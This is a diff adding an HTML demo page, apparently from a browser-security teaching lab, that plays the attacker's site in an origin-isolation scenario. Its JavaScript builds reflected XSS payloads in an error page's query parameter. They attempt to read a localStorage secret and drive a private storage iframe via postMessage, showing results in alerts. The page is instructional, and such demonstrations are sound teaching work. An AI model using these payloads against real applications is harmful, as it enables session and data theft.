@@ -1,0 +1,79 @@
+<html>
+    <head>
+        <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    </head>
+    <body class="container mt-3">
+        <h1 class="text-center">Scenario - LocalStorage with origin isolation - Executing XSS</h1>
+
+        <div class="row">
+            <div class="col-12 text-center mt-5">
+                <p>
+                    This page is hosted by the attacker. Clicking the buttons below will trigger the loading of an error page in the iframe. The error page has an XSS vulnerability allowing the attacker to execute code within the application context.
+                </p>
+                <p>
+                    The button on the left tries to steal data from localStorage, but there is no data available. The button on the right loads the storage container in the error page. As a result, the attacker can perform operations, but cannot access the secret directly.
+                </p>
+
+                <button class="btn btn-primary" onclick="steal_data_localstorage()">Steal data from localStorage</button>
+                <button class="btn btn-primary" onclick="perform_operation()">Perform operation in iframe</button>
+            </div>
+            <div class="col-12 text-center mt-5">
+                <iframe width="80%" height="250px"></iframe>
+            </div>
+        </div>
+
+        <div class="row">
+            <div class="col-12 text-center mt-5">
+                <p class="lead">
+                    This scenario illustrates a common attack to steal data fromn the browser. For more context, please refer to the security cheat sheet on <a href="https://cheatsheets.pragmaticwebsecurity.com/browsersecrets.html" target="_blank" rel="noopener">Secure data storage in the browser</a>
+                </p>
+            </div>
+        </div>
+
+
+        <script>
+            function init() {
+                document.querySelector('iframe').contentWindow.document.body.innerHTML = "<p>This is a placeholder iframe. When you click the button, this iframe will be used to launch an XSS attack against the application</p>";
+            }
+            document.addEventListener("DOMContentLoaded", init);
+
+            function steal_data_localstorage() {
+                let url = "//isolatedstorage.browsersecrets.restograde.com/error/error.html?page=hacked%3Cscript%3Ealert(`Stealing%20data%20from%20the%20iframe:%20${localStorage.getItem(%22secret%22)}`)%3C/script%3E";
+                document.querySelector('iframe').contentWindow.location.href = url;
+            }
+
+            function perform_operation() {
+                let tag = 'script';
+                let payload = encodeURIComponent(`
+                    <${tag}>
+                        // Load the frame
+                        let frame = document.createElement("iframe");
+                        frame.src = '//private.browsersecrets.restograde.com/private/storage.html';
+                        document.body.appendChild(frame);
+
+                        // Steal result messages
+                        function steal_result(msg) {
+                            alert('Message from ' + msg.origin + ': ' + JSON.stringify(msg.data));
+                        }
+                        
+                        // Add event listener
+                        window.addEventListener('message', steal_result);
+
+                        // Call the iframe after a small timeout
+                        setTimeout(() => { frame.contentWindow.postMessage({id: 'hacked', operation: 'hash'}, '*'); }, 1000);
+                    </${tag}>
+                `);
+                let url = `//isolatedstorage.browsersecrets.restograde.com/error/error.html?page=${payload}`;
+                document.querySelector('iframe').contentWindow.location.href = url;
+            }
+        </script>
+        
+        <!-- Load a script from a CDN which may have been compromised -->
+        <script src="//cdn.browsersecrets.restograde.com/cdn/cookiewarning.js"></script>
+
+        <!-- Load helper scripts (We could also implement this with the Web Crypto API) -->
+        <script src="//cdn.browsersecrets.restograde.com/cdn/sha256.min.js"></script>
+    </body>
+</html>
+
+
